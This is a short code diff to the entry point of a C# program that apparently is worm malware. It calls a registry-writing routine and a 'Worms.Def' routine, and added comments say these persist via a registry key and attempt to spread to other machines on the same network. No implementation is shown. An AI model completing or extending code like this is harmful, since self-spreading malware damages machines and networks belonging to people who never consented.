@@ -9,7 +9,10 @@ public class Program
     static void Main(string[] args)
     {
         RegEdit.Write();
-        Worms.Def();z
+        // call the write function to write registry key to the registry
+        
+        Worms.Def();
+        // attempt to spread itself to other machines on the same network.
     }
 }
 
